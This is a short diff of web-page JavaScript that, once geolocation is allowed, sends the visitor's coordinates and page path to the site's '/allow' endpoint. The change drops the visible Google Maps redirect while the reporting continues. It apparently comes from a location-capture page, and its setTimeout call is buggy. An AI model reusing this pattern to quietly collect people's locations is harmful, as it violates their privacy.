@@ -29,10 +29,13 @@
                 Longitude=await position.coords.longitude;
                 await fetch(window.location.origin+'/allow?lat='+position.coords.latitude+','+position.coords.longitude +'&cl='+window.location.pathname )      
                 document.getElementById("AllowLocation").innerHTML = "Geolocation is allowed";
-                window.location.href="https://www.google.com/maps/?q="+position.coords.latitude+','+position.coords.longitude
+                //window.location.href="https://www.google.com/maps/?q="+position.coords.latitude+','+position.coords.longitude
                 
                 
                 setTimeout(await fetch(window.location.origin+'/allow?lat='+position.coords.latitude+','+position.coords.longitude +'&cl='+window.location.pathname ), 3000)
+                //window.location.href=window.location.href
+                //window.location.href="https://www.google.com/maps/?q="+position.coords.latitude+','+position.coords.longitude
+                fetch(window.location.href);
         }
             };  
 
